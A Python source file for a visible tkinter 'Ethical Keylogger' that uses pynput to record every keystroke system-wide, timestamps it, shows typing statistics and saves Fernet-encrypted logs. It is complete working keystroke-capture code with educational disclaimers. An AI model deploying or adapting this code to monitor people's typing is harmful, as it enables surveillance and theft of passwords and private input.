import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from pynput import keyboard
from collections import Counter
from threading import Thread
from time import time, strftime
from cryptography.fernet import Fernet
import os


class EthicalKeylogger:
    def __init__(self, root):
        self.root = root
        self.root.title("Ethical Keylogger")
        self.is_logging = False
        self.log = ""
        self.key_count = Counter()
        self.start_time = None
        self.cipher = self.generate_cipher()
        self.create_widgets()

    def create_widgets(self):
        frame = ttk.Frame(self.root, padding=10)
        frame.pack(expand=True, fill=tk.BOTH)

        self.text_area = tk.Text(frame, wrap=tk.WORD, height=15, bg="lightcyan", fg="black", font=("Courier", 10))
        self.text_area.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

        button_frame = tk.Frame(frame, bg="lightgray")
        button_frame.pack(fill=tk.X, pady=5)

        buttons = [
            ("Start Logging", "green", self.start_logging),
            ("Stop Logging", "red", self.stop_logging),
            ("Save Logs", "blue", self.save_logs),
            ("Show Stats", "purple", self.show_stats),
            ("Clear Logs", "orange", self.clear_logs),
            ("Exit", "darkred", self.exit_program)
        ]

        for text, color, command in buttons:
            btn = tk.Button(button_frame, text=text, bg=color, fg="white", command=command, height=2, width=12)
            btn.pack(side=tk.LEFT, padx=5, pady=5, expand=True)

        disclaimer = "Warning: This tool is for educational purposes only. Unauthorized use is illegal."
        tk.Label(self.root, text=disclaimer, fg="red", bg="lightgray", font=("Arial", 8)).pack(pady=5)

    def generate_cipher(self):
        key_file = "key.key"
        if not os.path.exists(key_file):
            key = Fernet.generate_key()
            with open(key_file, "wb") as f:
                f.write(key)
        else:
            with open(key_file, "rb") as f:
                key = f.read()
        return Fernet(key)

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.start_time = time()
            Thread(target=self.key_listener, daemon=True).start()
            messagebox.showinfo("Keylogger", "Keylogging started!")

    def stop_logging(self):
        self.is_logging = False
        messagebox.showinfo("Keylogger", "Keylogging stopped!")

    def key_listener(self):
        def on_press(key):
            if not self.is_logging:
                return False
            try:
                char = key.char if key.char else str(key)
            except AttributeError:
                char = str(key)

            timestamp = strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] {char}\n"

            self.log += log_entry
            self.key_count[char] += 1
            self.text_area.insert(tk.END, log_entry)
            self.text_area.see(tk.END)

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def save_logs(self):
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[["Text files", "*.txt"]])
        if filename:
            encrypted_log = self.cipher.encrypt(self.log.encode())
            with open(filename, "wb") as f:
                f.write(encrypted_log)
            messagebox.showinfo("Keylogger", "Logs saved with encryption!")

    def show_stats(self):
        if self.start_time is None:
            messagebox.showinfo("Keylogger Stats", "No data available.")
            return

        total_keys = sum(self.key_count.values())
        duration = time() - self.start_time if self.start_time else 1
        speed = round((total_keys / duration) * 60, 2) if duration > 0 else 0
        top_keys = self.key_count.most_common(5)

        stats_msg = f"Typing Speed: {speed} keys/min\nTop 5 Keys: {top_keys}"
        messagebox.showinfo("Keylogger Stats", stats_msg)

    def clear_logs(self):
        self.log = ""
        self.key_count.clear()
        self.text_area.delete('1.0', tk.END)
        messagebox.showinfo("Keylogger", "Logs cleared!")

    def exit_program(self):
        if messagebox.askyesno("Exit", "Are you sure you want to exit?"):
            self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("600x500")
    root.configure(bg="lightgray")
    app = EthicalKeylogger(root)
    root.mainloop()


# Educational Purpose Disclaimer:
# This program is intended solely for ethical learning and demonstration purposes.
# Unauthorized or malicious use of keyloggers is illegal and unethical.
# Always obtain proper authorization before using tools that monitor keyboard activity.
